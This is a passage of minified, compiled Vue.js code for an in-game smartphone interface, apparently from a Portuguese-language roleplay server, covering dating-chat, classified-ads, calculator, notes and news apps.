    IT = {
        class: "flex justify-between"
    },
    OT = {
        class: "text-lg text-gray-800 w-96 overflow-x-hidden"
    },
    MT = {
        class: "text-lg text-gray-400"
    };
wT.render = function(e, t, n, l, a, s) {
    var o, r;
    const i = dl("Header");
    return wl(), _l("div", CT, [Pl(i), l.fresh.length ? (wl(), _l("div", _T, [AT, Pl("div", ST, [(wl(!0), _l(bl, null, fa(l.fresh, (t => (wl(), _l("div", {
        key: t.id,
        onClick: n => e.$router.push("/tinder/chats/" + t.id),
        class: "flex flex-col flex-shrink-0 justify-center pr-3"
    }, [Pl("img", {
        src: t.image,
        class: "w-20 h-20 rounded-full"
    }, null, 8, ["src"]), Pl("h1", RT, g(t.name), 1)], 8, ["onClick"])))), 128))])])) : Ml("", !0), (null == (o = l.conversations) ? void 0 : o.length) ? (wl(), _l("p", TT, "Mensagens")) : Ml("", !0), (null == (r = l.conversations) ? void 0 : r.length) ? (wl(), _l("div", ET, [(wl(!0), _l(bl, null, fa(l.conversations, (t => {
        var n;
        return wl(), _l("div", {
            key: t.id,
            onClick: n => e.$router.push("/tinder/chats/" + t.id),
            class: "mb-5 flex items-center"
        }, [Pl("img", {
            src: t.image,
            class: "w-24 h-24 rounded-full"
        }, null, 8, ["src"]), Pl("div", PT, [Pl("h1", LT, g(t.name), 1), Pl("div", IT, [Pl("p", OT, g(t.last_message.content.substr(0, 32)), 1), Pl("p", MT, g(e.$filters.unixToHHMM(null != (n = t.last_message.created_at) ? n : Date.now() / 1e3)), 1)])])], 8, ["onClick"])
    })), 128))])) : Ml("", !0)])
};
const VT = {
        setup() {
            jl("setDark")(!1);
            const e = ec(),
                t = Qi(),
                n = jl("confirm"),
                l = e.params.id,
                a = rt(),
                s = rt({}),
                r = rt({}),
                i = Ze([]);

            function c(e) {
                a.value || Lt((() => {
                    var t;
                    return null == (t = document.querySelector(".overflow-y-auto")) ? void 0 : t.scrollTo({
                        left: 0,
                        top: 9e6,
                        behavior: null != e ? e : "smooth"
                    })
                }))
            }
            return _o.backend.tinder_chat(l).then((e => {
                var {
                    messages: t,
                    avatars: n
                } = e, l = o(e, ["messages", "avatars"]);
                s.value = l, r.value = n, i.push(... function(e) {
                    const t = [];
                    let n = [];
                    for (let l of e) n.length && n[n.length - 1].sender != l.sender ? (t.push(n), n = [l]) : n.push(l);
                    return n.length && t.push(n), t
                }(t)), c("auto")
            })), _o.onceRoute("TINDER_MESSAGE", (e => {
                if (e.sender != l && e.target != l) return;
                const t = i[i.length - 1];
                t && t[0].sender == e.sender ? t.push(e) : i.push([e]), c()
            })), _o.onceRoute("TINDER_DISMATCH", (e => {
                e == l && t.back()
            })), _o.onceRoute("TINDER_LIKE", (e => {
                for (let t of i) {
                    const n = t.find((t => t.id == e));
                    n && (n.liked = 1)
                }
            })), {
                id: l,
                chat: s,
                blocks: i,
                avatars: r,
                content: a,
                sendMessage: function() {
                    a.value && (_o.backend.tinder_sendMessage(l, a.value), a.value = null)
                },
                dismatch: async function() {
                    n("Deseja dar dismatch?").then((e => e && _o.backend.tinder_dismatch(l).then((() => t.back()))))
                },
                like: function(e) {
                    e.liked || _o.backend.tinder_likeMessage(e.id)
                }
            }
        }
    },
    DT = sn("data-v-a4dd8eb2");
ln("data-v-a4dd8eb2");
const UT = {
        class: "h-full bg-white flex flex-col"
    },
    NT = {
        class: "mt-16 h-24 border-b flex-shrink-0"
    },
    $T = Pl("i", {
        class: "far fa-chevron-left text-5xl text-gray-400"
    }, null, -1),
    jT = {
        class: "text-center"
    },
    FT = {
        class: "text-xl font-semibold text-gray-600"
    },
    zT = Pl("i", {
        class: "fas fa-times text-5xl text-tinder"
    }, null, -1),
    BT = {
        class: "flex-1 overflow-y-auto hide-scroll px-4"
    },
    HT = {
        class: "text-center text-xl font-semibold text-gray-600"
    },
    qT = {
        class: "break-words"
    },
    GT = {
        key: 0,
        class: "absolute text-sm w-full -bottom-4.5 left-0 text-gray-500 text-right"
    },
    WT = {
        class: "flex-shrink-0 h-40 pt-4"
    },
    KT = {
        class: "bg-gray-100 h-24 mx-4 px-4 rounded-lg flex justify-between items-center"
    };
an();
const JT = DT(((e, t, n, l, a, s) => {
    var o;
    return wl(), _l("div", UT, [Pl("div", NT, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.back()),
        class: "absolute top-20 px-8"
    }, [$T]), Pl("div", jT, [Pl("img", {
        src: null != (o = l.chat.image) ? o : e.$asset("stock/user.svg"),
        class: "w-16 h-16 rounded-full mx-auto"
    }, null, 8, ["src"]), Pl("p", FT, g(l.chat.name), 1)]), Pl("button", {
        onClick: t[2] || (t[2] = e => l.dismatch()),
        class: "absolute top-20 right-8"
    }, [zT])]), Pl("div", BT, [(wl(!0), _l(bl, null, fa(l.blocks, ((t, n) => (wl(), _l("div", {
        key: n,
        class: "mb-4"
    }, [Pl("h1", HT, g(e.$filters.unixToLocale(t[0].created_at)), 1), Pl("div", {
        class: ["flex items-end", {
            "flex-row-reverse": t[0].sender != l.id
        }]
    }, [Pl("img", {
        src: l.avatars[t[0].sender],
        class: "w-16 h-16 rounded-full"
    }, null, 8, ["src"]), Pl("div", {
        class: ["mx-4 flex flex-col", {
            "items-start": t[0].sender == l.id,
            "items-end": t[0].sender != l.id
        }]
    }, [(wl(!0), _l(bl, null, fa(t, ((e, t) => (wl(), _l("div", {
        key: t,
        sender: e.sender != l.id,
        class: "relative min-8rem mb-4 last:mb-0 px-4 py-2 rounded-2xl"
    }, [Pl("p", qT, g(e.content), 1), e.sender != l.id && e.liked ? (wl(), _l("p", GT, "Curtiu sua mensagem")) : Ml("", !0), e.sender == l.id ? (wl(), _l("button", {
        key: 1,
        class: "absolute -right-12 top-2",
        onClick: t => l.like(e)
    }, [Pl("i", {
        class: ["fas fa-heart", {
            "text-gray-300": !e.liked,
            "text-tinder": e.liked
        }]
    }, null, 2)], 8, ["onClick"])) : Ml("", !0)], 8, ["sender"])))), 128))], 2)], 2)])))), 128))]), Pl("div", WT, [Pl("div", KT, [Zn(Pl("input", {
        "onUpdate:modelValue": t[3] || (t[3] = e => l.content = e),
        onKeydown: t[4] || (t[4] = us(((...e) => l.sendMessage && l.sendMessage(...e)), ["enter"])),
        maxlength: "255",
        type: "text",
        class: "p-4 bg-transparent text-xl flex-1",
        placeholder: "Digite uma mensagem"
    }, null, 544), [
        [ns, l.content]
    ]), Pl("button", {
        onClick: t[5] || (t[5] = (...e) => l.sendMessage && l.sendMessage(...e)),
        class: "ml-4 text-gray-400 text-2xl"
    }, "Enviar")])])])
}));
VT.render = JT, VT.__scopeId = "data-v-a4dd8eb2";
const XT = {
        components: {
            Header: CR
        },
        setup() {
            jl("setDark")(!1);
            const e = jl("alert");
            io();
            const t = rt({}),
                n = rt(_o.hasNotificationFor("tinder"));
            return Rn(n, (e => _o.setNotificationFor("tinder", e))), Rn((() => t.value.target), ((e, t) => t && _o.backend.tinder_changeTarget(e))), _o.backend.tinder().then((e => t.value = e)), {
                profile: t,
                notifications: n,
                changeAvatar: async function() {
                    try {
                        const e = await _o.useAnyImage("/tinder", !0);
                        await _o.backend.tinder_changeAvatar(e), t.value.image = e
                    } catch (e) {}
                },
                changeBio: function() {
                    const n = t.value.bio;
                    return n ? n.length > 1024 ? e("A bio não pode ser maior que 1024 caracteres") : void _o.backend.tinder_changeBio(n) : e("A bio não pode ficar vazia")
                },
                deleteAccount: function() {
                    _o.backend.tinder_delete().then((() => {
                        kO.replace("/home")
                    }))
                }
            }
        }
    },
    YT = sn("data-v-40fff8fa");
ln("data-v-40fff8fa");
const ZT = {
        class: "h-full bg-white flex flex-col"
    },
    QT = {
        key: 0
    },
    eE = {
        class: "relative"
    },
    tE = {
        class: "flex justify-center"
    },
    nE = {
        class: "font-bold"
    },
    lE = {
        class: "mx-4 mt-4"
    },
    aE = Pl("span", {
        class: "text-gray-500 text-2xl"
    }, "Biografia", -1),
    sE = {
        class: "mx-4 mt-4"
    },
    oE = Pl("label", null, "O que você busca?", -1),
    rE = {
        class: "px-4 mt-4"
    },
    iE = {
        class: "flex justify-between"
    },
    cE = Pl("p", {
        class: "text-3xl"
    }, "Notificações", -1),
    uE = {
        class: "text-center mt-32"
    };
an();
const dE = YT(((e, t, n, l, a, s) => {
    const o = dl("Header"),
        r = dl("app-select"),
        i = dl("app-toggle");
    return wl(), _l("div", ZT, [Pl(o), l.profile.id ? (wl(), _l("div", QT, [Pl("div", eE, [Pl("img", {
        src: l.profile.image,
        class: "relative mx-auto mt-16 w-64 h-64 rounded-full"
    }, null, 8, ["src"]), Pl("img", {
        onClick: t[1] || (t[1] = e => l.changeAvatar()),
        class: "absolute top-6 left-0 right-0 w-1/3 mx-auto opacity-0 hover:opacity-50 transition-opacity duration-300",
        style: {
            filter: "invert(1)"
        },
        src: "http://simpleicon.com/wp-content/uploads/camera.svg",
        alt: ""
    })]), Pl("div", tE, [Pl("p", nE, g(l.profile.name), 1), Pl("p", null, ", " + g(l.profile.age), 1)]), Pl("div", lE, [aE, Zn(Pl("textarea", {
        "onUpdate:modelValue": t[2] || (t[2] = e => l.profile.bio = e),
        onChange: t[3] || (t[3] = (...e) => l.changeBio && l.changeBio(...e)),
        class: "block w-full h-64 p-3 rounded-xl resize-none text-2xl",
        spellcheck: "false"
    }, null, 544), [
        [ns, l.profile.bio]
    ])]), Pl("div", sE, [oE, Pl(r, {
        modelValue: l.profile.target,
        "onUpdate:modelValue": t[4] || (t[4] = e => l.profile.target = e),
        options: {
            Male: "Homens",
            Female: "Mulheres",
            All: "Todos"
        }
    }, null, 8, ["modelValue"])]), Pl("div", rE, [Pl("div", iE, [cE, Pl(i, {
        modelValue: l.notifications,
        "onUpdate:modelValue": t[5] || (t[5] = e => l.notifications = e)
    }, null, 8, ["modelValue"])])]), Pl("div", uE, [Pl("button", {
        onClick: t[6] || (t[6] = (...e) => l.deleteAccount && l.deleteAccount(...e)),
        class: "bg-red-600 text-white rounded p-2 px-4 text-2xl"
    }, "Excluir minha conta")])])) : Ml("", !0)])
}));
XT.render = dE, XT.__scopeId = "data-v-40fff8fa";
const pE = {
    setup() {
        jl("setDark")();
        const e = ec().params.id,
            t = {
                dark: _o.darkTheme.value || "",
                fontSize: document.documentElement.style.fontSize,
                android: _o.settings.isAndroid
            },
            n = Object.entries(t).map((e => e.map(encodeURIComponent).join("="))).join("&");
        return {
            src: da((() => {
                var t;
                return (null == (t = _o.settings.customApps) ? void 0 : t[e]) + "?" + n
            })),
            id: e
        }
    }
};
pE.render = function(e, t, n, l, a, s) {
    return wl(), _l("iframe", {
        key: l.id,
        class: "w-full h-full bg-theme",
        src: l.src,
        frameborder: "0"
    }, null, 8, ["src"])
};
const fE = {
        props: ["title"],
        setup: () => ({
            isAndroid: _o.settings.isAndroid
        })
    },
    mE = {
        class: "h-32 pt-16 bg-theme-accent border-b border-theme"
    },
    hE = {
        key: 0,
        class: "far fa-arrow-left"
    },
    bE = {
        key: 1,
        class: "fas fa-chevron-left text-blue-400"
    };
fE.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", mE, [Pl("button", {
        onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t)),
        class: "absolute top-16 left-0 px-4"
    }, [l.isAndroid ? (wl(), _l("i", hE)) : (wl(), _l("i", bE))]), Pl("h1", {
        class: ["font-bold", {
            "ml-16": l.isAndroid,
            "text-center": !l.isAndroid
        }]
    }, g(n.title), 3), Zt(e.$slots, "default")])
};
const gE = {
        components: {
            Header: fE
        },
        setup() {
            jl("setDark")(_o.darkTheme.value);
            const e = jl("confirm"),
                t = (e, t) => e.toLowerCase().includes(t.toLowerCase()),
                n = rt(""),
                l = rt([]),
                a = da((() => {
                    const e = n.value;
                    return e ? l.value.filter((({
                        title: n,
                        author: l
                    }) => t(n, e) || t(l.name, e) || t(l.phone, e))) : l.value
                })),
                s = da((() => l.value.some((e => e.author.user_id == _o.identity.user_id))));
            return _o.backend.yellowpages_index().then((e => l.value = e)), {
                dark: _o.darkTheme,
                hasPost: s,
                query: n,
                posts: a,
                call: function(e) {
                    _o.pusher.emit("CALL_TO", e)
                },
                destroy: function() {
                    e("Deseja excluir seu anúncio?").then((e => e && _o.backend.yellowpages_destroy().then((() => {
                        l.value = l.value.filter((e => e.author.user_id != _o.identity.user_id))
                    }))))
                }
            }
        }
    },
    vE = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    xE = Pl("i", {
        class: "far fa-times text-red-500"
    }, null, -1),
    yE = Pl("i", {
        class: "far fa-plus text-blue-500"
    }, null, -1),
    kE = {
        class: "flex-shrink p-5 relative"
    },
    wE = {
        class: "flex-1 overflow-y-auto hide-scroll px-5"
    },
    CE = {
        class: "text-center break-words pb-2"
    },
    _E = {
        class: "grid grid-cols-2 border-t border-yellow-700 pt-2 text-3xl"
    },
    AE = {
        class: "text-center border-r border-yellow-700"
    };
gE.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("app-input");
    return wl(), _l("div", vE, [Pl(o, {
        title: "Yellow Pages"
    }, {
        default: en((() => [l.hasPost ? (wl(), _l("button", {
            key: 0,
            class: "absolute top-16 right-0 px-5",
            onClick: t[1] || (t[1] = (...e) => l.destroy && l.destroy(...e))
        }, [xE])) : (wl(), _l("button", {
            key: 1,
            class: "absolute top-16 right-0 px-5",
            onClick: t[2] || (t[2] = t => e.$router.push("/yellowpages/create"))
        }, [yE]))])),
        _: 1
    }), Pl("div", kE, [Pl("i", {
        class: ["absolute top-9 left-10 fas fa-search text-2xl", [l.dark ? "text-gray-800" : "text-gray-400"]]
    }, null, 2), Pl(r, {
        modelValue: l.query,
        "onUpdate:modelValue": t[3] || (t[3] = e => l.query = e),
        placeholder: "Buscar",
        class: "text-2xl bg-theme border-theme pl-14"
    }, null, 8, ["modelValue"])]), Pl("ul", wE, [(wl(!0), _l(bl, null, fa(l.posts, (e => (wl(), _l("li", {
        key: e.id,
        class: "bg-yellow-400 text-yellow-700 mx-auto p-5 mb-4"
    }, [Pl("p", CE, g(e.title), 1), Pl("div", _E, [Pl("p", AE, g(e.author.name), 1), Pl("button", {
        class: "text-center",
        onClick: t => l.call(e.author.phone)
    }, g(e.author.phone), 9, ["onClick"])])])))), 128))])])
};
const SE = {
        components: {
            Header: fE
        },
        setup() {
            jl("setDark")(_o.darkTheme.value);
            const e = Qi(),
                t = rt("");
            return {
                dark: _o.darkTheme,
                title: t,
                publish: function() {
                    t.value.trim().length && _o.backend.yellowpages_store(t.value).then((() => e.back()))
                }
            }
        }
    },
    RE = {
        class: "h-full bg-theme text-theme"
    },
    TE = {
        class: "p-5"
    },
    EE = Pl("label", null, "Título", -1);
SE.render = function(e, t, n, l, a, s) {
    const o = dl("Header");
    return wl(), _l("div", RE, [Pl(o, {
        title: "Criar um anúncio"
    }), Pl("div", TE, [EE, Zn(Pl("textarea", {
        "onUpdate:modelValue": t[1] || (t[1] = e => l.title = e),
        maxlength: "100",
        class: "block p-4 text-3xl text-theme w-full h-64 bg-theme border border-theme resize-none rounded-xl"
    }, null, 512), [
        [ns, l.title]
    ]), Pl("button", {
        onClick: t[2] || (t[2] = (...e) => l.publish && l.publish(...e)),
        class: "block ml-auto mt-4 px-4 py-3 rounded-xl bg-yellow-400 text-yellow-700"
    }, "Publicar")])])
};
const PE = {
        inject: ["setDark"],
        data: () => ({
            result: 0,
            tmp_value: 0,
            reset: !1,
            operator: void 0,
            lastOperation: void 0
        }),
        created() {
            this.setDark(!0)
        },
        methods: {
            clear() {
                this.result = 0, this.tmp_value = 0, this.operator = void 0, this.lastOperation = void 0
            },
            invert() {
                this.result *= -1
            },
            percent() {
                this.result = this.result / 100 * this.tmp_value
            },
            addNumber(e) {
                0 != this.result && !0 !== this.reset || (this.result = "", this.reset = !1), this.result += e.toString()
            },
            addPoint() {
                this.result.includes(".") || (this.result += ".")
            },
            setOperator(e) {
                0 != this.tmp_value && this.calculate(), this.tmp_value = this.result, this.operator = e, this.reset = !0
            },
            equal() {
                if (!this.operator && this.lastOperation) {
                    const [e, t] = this.lastOperation;
                    this.operator = e, this.tmp_value = this.result, this.result = t
                }
                this.calculate(), this.tmp_value = 0, this.operator = void 0
            },
            calculate() {
                let e = 0,
                    t = parseFloat(this.tmp_value),
                    n = parseFloat(this.result);
                switch (this.operator) {
                    case "+":
                        e = t + n;
                        break;
                    case "-":
                        e = t - n;
                        break;
                    case "*":
                        e = t * n;
                        break;
                    case "/":
                        e = t / n
                }
                this.lastOperation = [this.operator, n], this.result = e.toString()
            }
        }
    },
    LE = {
        class: "flex flex-col h-full bg-black"
    },
    IE = {
        class: "h-full p-5 pt-80 mt-32"
    },
    OE = {
        class: "flex justify-around"
    },
    ME = Pl("i", {
        class: "fas fa-divide"
    }, null, -1),
    VE = {
        class: "flex justify-around mt-4"
    },
    DE = Pl("i", {
        class: "fas fa-times"
    }, null, -1),
    UE = {
        class: "flex justify-around mt-4"
    },
    NE = Pl("i", {
        class: "fas fa-minus"
    }, null, -1),
    $E = {
        class: "flex justify-around mt-4"
    },
    jE = Pl("i", {
        class: "fas fa-plus"
    }, null, -1),
    FE = {
        class: "flex justify-around mt-4"
    },
    zE = Pl("i", {
        class: "fas fa-equals"
    }, null, -1);
PE.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", LE, [Pl("div", IE, [Zn(Pl("input", {
        class: "block bg-transparent text-white w-full text-right p-4 h-52",
        style: {
            fontSize: Math.min(8, 20 / String(a.result).length * 2.75) + "rem"
        },
        type: "text",
        "onUpdate:modelValue": t[1] || (t[1] = e => a.result = e),
        disabled: ""
    }, null, 4), [
        [ns, a.result]
    ]), Pl("div", OE, [Pl("div", {
        class: "bg-gray-500 w-28 py-8 text-center rounded-full",
        onClick: t[2] || (t[2] = (...e) => s.clear && s.clear(...e))
    }, "AC"), Pl("div", {
        class: "bg-gray-500 w-28 py-8 text-center rounded-full",
        onClick: t[3] || (t[3] = (...e) => s.invert && s.invert(...e))
    }, "+/-"), Pl("div", {
        class: "bg-gray-500 w-28 py-8 text-center rounded-full",
        onClick: t[4] || (t[4] = (...e) => s.percent && s.percent(...e))
    }, "%"), Pl("div", {
        class: "bg-orange-400 text-white w-28 py-8 text-center rounded-full",
        onClick: t[5] || (t[5] = e => s.setOperator("/"))
    }, [ME])]), Pl("div", VE, [(wl(), _l(bl, null, fa([7, 8, 9], (e => Pl("div", {
        key: e,
        onClick: t => s.addNumber(e),
        class: "bg-gray-800 text-white w-28 py-8 text-center rounded-full"
    }, g(e), 9, ["onClick"]))), 64)), Pl("div", {
        class: "bg-orange-400 text-white w-28 text-center py-8 rounded-full",
        onClick: t[6] || (t[6] = e => s.setOperator("*"))
    }, [DE])]), Pl("div", UE, [(wl(), _l(bl, null, fa([4, 5, 6], (e => Pl("div", {
        key: e,
        onClick: t => s.addNumber(e),
        class: "bg-gray-800 text-white w-28 py-8 text-center rounded-full"
    }, g(e), 9, ["onClick"]))), 64)), Pl("div", {
        class: "bg-orange-400 text-white w-28 text-center py-8 rounded-full",
        onClick: t[7] || (t[7] = e => s.setOperator("-"))
    }, [NE])]), Pl("div", $E, [(wl(), _l(bl, null, fa([1, 2, 3], (e => Pl("div", {
        key: e,
        onClick: t => s.addNumber(e),
        class: "bg-gray-800 text-white w-28 py-8 text-center rounded-full"
    }, g(e), 9, ["onClick"]))), 64)), Pl("div", {
        class: "bg-orange-400 text-white w-28 text-center py-8 rounded-full",
        onClick: t[8] || (t[8] = e => s.setOperator("+"))
    }, [jE])]), Pl("div", FE, [Pl("div", {
        onClick: t[9] || (t[9] = e => s.addNumber(0)),
        class: "bg-gray-800 text-white w-60 py-8 pl-12 rounded-full"
    }, "0"), Pl("div", {
        onClick: t[10] || (t[10] = (...e) => s.addPoint && s.addPoint(...e)),
        class: "bg-gray-800 text-white w-28 py-8 text-center rounded-full"
    }, "."), Pl("div", {
        class: "bg-orange-400 text-white w-28 text-center py-8 rounded-full",
        onClick: t[11] || (t[11] = (...e) => s.equal && s.equal(...e))
    }, [zE])])])])
};
const BE = {
        props: ["title"],
        setup: () => ({
            isAndroid: _o.settings.isAndroid
        })
    },
    HE = {
        class: "flex flex-shrink-0 h-32 pt-16 bg-theme-accent border-b border-theme"
    },
    qE = {
        key: 0,
        class: "far fa-arrow-left"
    },
    GE = {
        key: 1,
        class: "fas fa-chevron-left text-note"
    };
BE.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", HE, [Pl("button", {
        class: "absolute left-0 top-16 px-5",
        onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
    }, [l.isAndroid ? (wl(), _l("i", qE)) : (wl(), _l("i", GE))]), Pl("h1", {
        class: [{
            "ml-16": l.isAndroid,
            "mx-auto": !l.isAndroid
        }, "font-bold"]
    }, g(n.title), 3), Zt(e.$slots, "default")])
};
const WE = {
        components: {
            Header: BE
        },
        setup() {
            jl("setDark")(_o.darkTheme.value);
            const e = jl("confirm"),
                t = localStorage.getItem("smartphone@notes"),
                n = rt(t ? JSON.parse(t) : []);
            return {
                notes: n,
                change: function(e, t) {
                    const l = n.value,
                        a = l[t];
                    l[t] = l[e], l[e] = a, localStorage.setItem("smartphone@notes", JSON.stringify(l))
                },
                destroy: function(t) {
                    e("Deseja apagar essa anotação?").then((e => {
                        if (e) {
                            const e = n.value;
                            e.splice(t, 1), localStorage.setItem("smartphone@notes", JSON.stringify(e))
                        }
                    }))
                }
            }
        }
    },
    KE = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    JE = Pl("i", {
        class: "far fa-plus text-note"
    }, null, -1),
    XE = {
        class: "flex-grow overflow-y-auto hide-scroll"
    },
    YE = Pl("i", {
        class: "fas fa-chevron-up text-lg text-note"
    }, null, -1),
    ZE = Pl("i", {
        class: "fas fa-chevron-down text-lg text-note"
    }, null, -1),
    QE = {
        class: "ml-4 flex flex-col"
    },
    eP = {
        key: 0,
        class: "text-2xl overflow-x-hidden"
    },
    tP = {
        key: 1,
        class: "text-2xl italic"
    },
    nP = {
        class: "text-gray-500 text-xl"
    },
    lP = Pl("i", {
        class: "far fa-trash-alt text-note text-xl"
    }, null, -1);
WE.render = function(e, t, n, l, a, s) {
    const o = dl("Header");
    return wl(), _l("div", KE, [Pl(o, {
        title: "Notas"
    }, {
        default: en((() => [Pl("button", {
            class: "absolute right-0 top-16 px-5",
            onClick: t[1] || (t[1] = t => e.$router.push("/notes/create"))
        }, [JE])])),
        _: 1
    }), Pl("ul", XE, [(wl(!0), _l(bl, null, fa(l.notes, ((n, a) => (wl(), _l("li", {
        key: a,
        class: "flex items-center border-b border-theme p-2",
        onClick: t => e.$router.push("/notes/" + a)
    }, [Pl("div", {
        class: "flex flex-col",
        onClick: t[2] || (t[2] = is((() => {}), ["stop"]))
    }, [a > 0 ? (wl(), _l("button", {
        key: 0,
        onClick: is((e => l.change(a, a - 1)), ["stop"])
    }, [YE], 8, ["onClick"])) : Ml("", !0), a < l.notes.length - 1 ? (wl(), _l("button", {
        key: 1,
        onClick: is((e => l.change(a, a + 1)), ["stop"])
    }, [ZE], 8, ["onClick"])) : Ml("", !0)]), Pl("div", QE, [n.text.trim() ? (wl(), _l("p", eP, g(n.text.substr(0, 32)), 1)) : (wl(), _l("p", tP, "(Sem conteúdo)")), Pl("p", nP, g(new Date(n.updated_at).toLocaleString("pt-BR")), 1)]), Pl("button", {
        class: "ml-auto px-5",
        onClick: is((e => l.destroy(a)), ["stop"])
    }, [lP], 8, ["onClick"])], 8, ["onClick"])))), 128))])])
};
const aP = {
        components: {
            Header: BE
        },
        setup() {
            jl("setDark")(_o.darkTheme.value);
            const e = Qi(),
                t = rt("");
            return Lt((() => document.querySelector("textarea").focus())), {
                text: t,
                save: function() {
                    var n;
                    const l = JSON.parse(null != (n = localStorage.getItem("smartphone@notes")) ? n : "[]"),
                        a = Date.now();
                    l.push({
                        text: t.value,
                        created_at: a,
                        updated_at: a
                    }), localStorage.setItem("smartphone@notes", JSON.stringify(l)), e.back()
                }
            }
        }
    },
    sP = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    oP = Pl("i", {
        class: "far fa-file text-note"
    }, null, -1);
aP.render = function(e, t, n, l, a, s) {
    const o = dl("Header");
    return wl(), _l("div", sP, [Pl(o, {
        title: "Nova anotação"
    }, {
        default: en((() => [Pl("button", {
            class: "absolute right-0 top-16 px-5",
            onClick: t[1] || (t[1] = (...e) => l.save && l.save(...e))
        }, [oP])])),
        _: 1
    }), Zn(Pl("textarea", {
        onKeydown: t[2] || (t[2] = us(is((() => {}), ["prevent"]), ["enter"])),
        maxlength: "10000",
        class: "flex-1 w-full p-2 fancy-scroll resize-none bg-theme",
        "onUpdate:modelValue": t[3] || (t[3] = e => l.text = e)
    }, null, 544), [
        [ns, l.text]
    ])])
};
const rP = {
        components: {
            Header: BE
        },
        setup() {
            jl("setDark")(_o.darkTheme.value);
            const e = Qi(),
                t = e.currentRoute.value.params.id,
                n = rt(JSON.parse(localStorage.getItem("smartphone@notes"))[t].text);
            return {
                text: n,
                save: function() {
                    const l = JSON.parse(localStorage.getItem("smartphone@notes"));
                    l[t].text = n.value, l[t].updated_at = Date.now(), localStorage.setItem("smartphone@notes", JSON.stringify(l)), e.back()
                }
            }
        }
    },
    iP = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    cP = Pl("i", {
        class: "far fa-pencil text-note"
    }, null, -1);
rP.render = function(e, t, n, l, a, s) {
    const o = dl("Header");
    return wl(), _l("div", iP, [Pl(o, {
        title: "Editar anotação"
    }, {
        default: en((() => [Pl("button", {
            class: "absolute right-0 top-16 px-5",
            onClick: t[1] || (t[1] = (...e) => l.save && l.save(...e))
        }, [cP])])),
        _: 1
    }), Zn(Pl("textarea", {
        onKeydown: t[2] || (t[2] = us(is((() => {}), ["prevent"]), ["enter"])),
        maxlength: "10000",
        class: "flex-1 w-full p-2 fancy-scroll resize-none bg-theme",
        "onUpdate:modelValue": t[3] || (t[3] = e => l.text = e)
    }, null, 544), [
        [ns, l.text]
    ])])
};
const uP = Ze([]),
    dP = {
        inject: ["setDark"],
        setup() {
            const e = _o.settings.isAndroid,
                t = Ys("weazel"),
                n = Ze(_o.localhost ? [{
                    id: 1,
                    title: "Jacinto pinto morre engasgado",
                    description: "Não foi encontrado nenhum pinto no local, a policia informou que está atrás de quem possa ter causado este incidente...",
                    imageURL: "https://picsum.photos/200",
                    views: 0,
                    created_at: Date.now() / 1e3 - 300
                }] : []),
                l = rt(),
                a = rt(_o.localhost),
                s = rt(_o.hasNotificationFor("weazel"));
            return Rn(s, (e => _o.setNotificationFor("weazel", e))), uP.length || _o.backend.weazel_tags().then((e => uP.push(...e))), _o.backend.weazel_index().then((e => {
                n.push(...e)
            })), _o.backend.weazel_check().then((e => a.value = e)), _o.pusher.on("WEAZEL_DESTROY", (e => {
                const t = n.findIndex((t => t.id == e));
                t >= 0 && n.splice(t, 1)
            })), {
                isAndroid: e,
                isJournalist: a,
                notifications: s,
                destroy: async function(e) {
                    await _o.confirm("Tem certeza que deseja excluir esta notícia?") && _o.backend.weazel_destroy(e)
                },
                title: t,
                news: n,
                tags: uP,
                setTag: function(e) {
                    l.value != e && (l.value = e, _o.backend.weazel_tag(e).then((e => {
                        n.length = 0, n.push(...e)
                    })))
                }
            }
        },
        created() {
            this.setDark(!0)
        }
    },
    pP = {
        class: "h-full flex flex-col bg-theme text-theme"
    },
    fP = {
        class: "h-32 pt-12 bg-weazel flex items-center"
    },
    mP = {
        key: 0,
        class: "far fa-arrow-left mr-4"
    },
    hP = {
        key: 1,
        class: "fas fa-chevron-left"
    },
    bP = {
        key: 0,
        class: "far fa-bell"
    },
    gP = {
        key: 1,
        class: "far fa-bell-slash"
    },
    vP = Pl("i", {
        class: "fas fa-pen-alt"
    }, null, -1),
    xP = {
        class: "flex-1 overflow-y-auto hide-scroll"
    },
    yP = {
        class: "flex flex-wrap p-5 text-xl"
    },
    kP = {
        class: "p-5 rounded-xl"
    },
    wP = {
        class: "flex items-start"
    },
    CP = {
        class: "flex-1"
    },
    _P = {
        class: "text-3xl mb-2 font-bold"
    },
    AP = {
        class: "text-lg opacity-75 overflow-ellipsis"
    },
    SP = {
        class: "flex items-center text-xl"
    },
    RP = {
        class: "opacity-50"
    },
    TP = Pl("i", {
        class: "far fa-eye ml-2 mr-1"
    }, null, -1),
    EP = {
        key: 0,
        class: "ml-auto space-x-4"
    },
    PP = Pl("i", {
        class: "fas fa-pen-alt"
    }, null, -1),
    LP = Pl("i", {
        class: "far fa-trash-alt"
    }, null, -1);
dP.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", pP, [Pl("div", fP, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.back()),
        class: "absolute top-16 px-5"
    }, [l.isAndroid ? (wl(), _l("i", mP)) : (wl(), _l("i", hP))]), Pl("h1", {
        class: [{
            "ml-16": l.isAndroid,
            "mx-auto": !l.isAndroid
        }, "font-bold"]
    }, g(l.title), 3), Pl("button", {
        onClick: t[2] || (t[2] = e => l.notifications = !l.notifications),
        class: "absolute top-20 right-8 w-6 h-4 flex flex-center"
    }, [l.notifications ? (wl(), _l("i", bP)) : (wl(), _l("i", gP))])]), l.isJournalist ? (wl(), _l("button", {
        key: 0,
        onClick: t[3] || (t[3] = t => e.$router.push("/weazel/create")),
        class: "bg-weazel w-24 h-24 absolute bottom-8 right-8 rounded-full"
    }, [vP])) : Ml("", !0), Pl("div", xP, [Pl("div", yP, [(wl(!0), _l(bl, null, fa(l.tags, (e => (wl(), _l("button", {
        key: e,
        onClick: t => l.setTag(e),
        class: "bg-theme-accent p-2 mt-2 rounded-xl mr-5"
    }, g(e), 9, ["onClick"])))), 128))]), Pl("ul", kP, [(wl(!0), _l(bl, null, fa(l.news, (t => (wl(), _l("li", {
        key: t.id,
